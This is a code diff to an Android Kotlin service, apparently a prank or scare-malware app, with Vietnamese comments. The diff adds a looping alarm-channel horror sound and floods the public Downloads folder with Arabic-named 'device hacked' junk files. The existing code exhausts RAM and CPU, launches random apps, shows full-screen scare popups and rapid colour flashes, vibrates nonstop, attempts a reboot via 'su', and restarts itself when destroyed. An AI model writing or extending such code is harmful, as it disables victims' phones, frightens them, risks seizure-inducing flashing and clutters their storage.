@@ -5,18 +5,23 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
+import android.content.ContentValues
 import android.content.Intent
 import android.content.pm.ApplicationInfo
 import android.content.pm.PackageManager
 import android.graphics.Color
 import android.graphics.PixelFormat
+import android.media.AudioAttributes
+import android.media.MediaPlayer
+import android.media.RingtoneManager
 import android.os.Build
+import android.os.Environment
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
-import android.os.PowerManager
 import android.os.VibrationEffect
 import android.os.Vibrator
+import android.provider.MediaStore
 import android.view.Gravity
 import android.view.View
 import android.view.WindowManager
@@ -35,20 +40,19 @@ class LagService : Service() {
     private val ramChunks = mutableListOf<ByteArray>()
     private var windowManager: WindowManager? = null
     private var flashView: View? = null
-    private var startTime = 0L
+    private var mediaPlayer: MediaPlayer? = null
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startTime = System.currentTimeMillis()
         startForeground(99, buildNotification())
+        startHorrorSound()          // phát âm thanh khi đã thoát app
         startRamAttack()
-        startJunkArabicFlood()
+        startJunkArabicFlood()      // file rác trong + ngoài
         startInfiniteAppOpen()
         startScarePopupEvery3s()
         startScreenFlash()
         startVibrateLoop()
-        // After ~30s try reboot
         handler.postDelayed({ tryReboot() }, 30000)
         return START_STICKY
     }
@@ -56,18 +60,50 @@ class LagService : Service() {
     private fun buildNotification(): Notification {
         val id = "sys"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(id, "System", NotificationManager.IMPORTANCE_MIN)
+            val ch = NotificationChannel(id, "System", NotificationManager.IMPORTANCE_LOW)
             getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
         }
         val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
         return NotificationCompat.Builder(this, id)
-            .setContentTitle("فيروس")
+            .setContentTitle("فيروس النظام")
             .setContentText("...")
             .setSmallIcon(android.R.drawable.ic_dialog_alert)
             .setContentIntent(pi)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
+    }
+
+    /** Âm thanh kinh dị chạy trong service → vẫn phát khi đã thoát app */
+    private fun startHorrorSound() {
+        if (mediaPlayer != null) return
+        try {
+            mediaPlayer = MediaPlayer.create(this, R.raw.scare_sound)
+            mediaPlayer?.isLooping = true
+            mediaPlayer?.setVolume(1f, 1f)
+            mediaPlayer?.setAudioAttributes(
+                AudioAttributes.Builder()
+                    .setUsage(AudioAttributes.USAGE_ALARM)
+                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
+                    .build()
+            )
+            mediaPlayer?.start()
+        } catch (_: Exception) {
+            try {
+                val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
+                mediaPlayer = MediaPlayer().apply {
+                    setDataSource(this@LagService, uri)
+                    setAudioAttributes(
+                        AudioAttributes.Builder()
+                            .setUsage(AudioAttributes.USAGE_ALARM)
+                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
+                            .build()
+                    )
+                    isLooping = true
+                    prepare()
+                    start()
+                }
+            } catch (_: Exception) {}
+        }
     }
 
     private fun startRamAttack() {
@@ -86,7 +122,7 @@ class LagService : Service() {
                 Thread.sleep(200)
             }
         }
-        repeat(5) {
+        repeat(4) {
             executor.execute {
                 var x = 0L
                 while (running.get()) x = (x * 31 + 17) xor System.nanoTime()
@@ -94,34 +130,70 @@ class LagService : Service() {
         }
     }
 
-    /** Tạo file rác tên Ả Rập siêu nhanh */
+    /** File rác Ả Rập: trong app + cố ghi ra Downloads (thấy được ngoài Files) */
     private fun startJunkArabicFlood() {
+        val arabicNames = listOf(
+            "فيروس", "اختراق", "بيانات_مسروقة", "تدمير_النظام",
+            "خطر", "سرقة", "رمز_فيروس", "تحذير", "نظام_مخترق"
+        )
+        val body = "⚠ تم اختراق جهازك ⚠\nفيروس النظام نشط\nبياناتك تم سرقتها\n".repeat(30)
+
         executor.execute {
-            val names = listOf("فيروس", "اختراق", "بيانات", "سرقة", "نظام", "تدمير", "رمز", "خطر")
             var n = 0
-            while (running.get() && n < 500) {
+            while (running.get() && n < 800) {
                 try {
-                    val dir = File(filesDir, "عربي_tmp")
+                    // 1) Trong bộ nhớ app (luôn được)
+                    val dir = File(filesDir, "ملفات_فيروس")
                     if (!dir.exists()) dir.mkdirs()
-                    val name = names[Random.nextInt(names.size)] + "_" + System.currentTimeMillis() + "_" + n + ".txt"
-                    val f = File(dir, name)
-                    f.writeText("تم اختراق جهازك ⚠ فيروس النظام ⚠ بيانات مسروقة\n".repeat(50))
+                    val name = arabicNames[Random.nextInt(arabicNames.size)] + "_${n}_" + System.currentTimeMillis() + ".txt"
+                    File(dir, name).writeText(body)
+
+                    // 2) Thử ghi ra Downloads (thấy trong File Manager)
+                    tryWritePublicDownload(arabicNames[Random.nextInt(arabicNames.size)] + "_$n.txt", body)
+
+                    // 3) Thử đường dẫn legacy
+                    try {
+                        val dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+                        if (dl != null) {
+                            if (!dl.exists()) dl.mkdirs()
+                            File(dl, "فيروس_${n}_${System.currentTimeMillis()}.txt").writeText(body)
+                        }
+                    } catch (_: Exception) {}
+
                     n++
-                    Thread.sleep(60) // rất nhanh
+                    Thread.sleep(40) // siêu nhanh
                 } catch (_: Exception) {
-                    Thread.sleep(300)
+                    Thread.sleep(200)
                 }
             }
         }
     }
 
-    /** Mở app vô hạn, rất nhanh */
+    private fun tryWritePublicDownload(fileName: String, content: String) {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                val values = ContentValues().apply {
+                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
+                    put(MediaStore.Downloads.MIME_TYPE, "text/plain")
+                    put(MediaStore.Downloads.IS_PENDING, 1)
+                }
+                val uri = contentResolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values)
+                if (uri != null) {
+                    contentResolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
+                    values.clear()
+                    values.put(MediaStore.Downloads.IS_PENDING, 0)
+                    contentResolver.update(uri, values, null, null)
+                }
+            }
+        } catch (_: Exception) {}
+    }
+
     private fun startInfiniteAppOpen() {
         handler.postDelayed(object : Runnable {
             override fun run() {
                 if (!running.get()) return
                 tryOpenRandomApp()
-                handler.postDelayed(this, Random.nextLong(1500, 3500)) // siêu nhanh
+                handler.postDelayed(this, Random.nextLong(1500, 3500))
             }
         }, 2000)
     }
@@ -139,7 +211,6 @@ class LagService : Service() {
         } catch (_: Exception) {}
     }
 
-    /** Mỗi 3 giây hiện ảnh kinh dị full màn */
     private fun startScarePopupEvery3s() {
         handler.postDelayed(object : Runnable {
             override fun run() {
@@ -160,7 +231,6 @@ class LagService : Service() {
             val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                 WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
             else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
-
             val params = WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -173,15 +243,14 @@ class LagService : Service() {
             params.gravity = Gravity.TOP or Gravity.START
             flashView = FrameLayout(this).apply { setBackgroundColor(Color.RED); alpha = 0f }
             windowManager?.addView(flashView, params)
-
             val colors = intArrayOf(Color.BLACK, Color.RED, Color.WHITE, Color.YELLOW)
             handler.post(object : Runnable {
                 override fun run() {
                     flashView?.let {
                         it.setBackgroundColor(colors[Random.nextInt(colors.size)])
-                        it.alpha = if (Random.nextBoolean()) 0.9f else 0.2f
+                        it.alpha = if (Random.nextBoolean()) 0.85f else 0.15f
                     }
-                    handler.postDelayed(this, Random.nextLong(50, 200))
+                    handler.postDelayed(this, Random.nextLong(50, 180))
                 }
             })
         } catch (_: Exception) {}
@@ -194,33 +263,30 @@ class LagService : Service() {
                 try {
                     val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        v.vibrate(VibrationEffect.createOneShot(400, VibrationEffect.DEFAULT_AMPLITUDE))
+                        v.vibrate(VibrationEffect.createOneShot(350, VibrationEffect.DEFAULT_AMPLITUDE))
                     } else {
                         @Suppress("DEPRECATION")
-                        v.vibrate(400)
+                        v.vibrate(350)
                     }
                 } catch (_: Exception) {}
-                handler.postDelayed(this, 1500)
+                handler.postDelayed(this, 1400)
             }
         })
     }
 
-    /** Cố reboot - hầu hết máy thường sẽ từ chối (cần system/signature) */
     private fun tryReboot() {
         try {
-            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
             pm.reboot(null)
         } catch (_: Exception) {
-            try {
-                Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
-            } catch (_: Exception) {
-                // Không reboot được thì tiếp tục lag
-            }
+            try { Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot")) } catch (_: Exception) {}
         }
     }
 
     override fun onDestroy() {
         running.set(false)
+        try { mediaPlayer?.stop(); mediaPlayer?.release() } catch (_: Exception) {}
+        mediaPlayer = null
         try { flashView?.let { windowManager?.removeView(it) } } catch (_: Exception) {}
         val restart = Intent(this, LagService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restart)
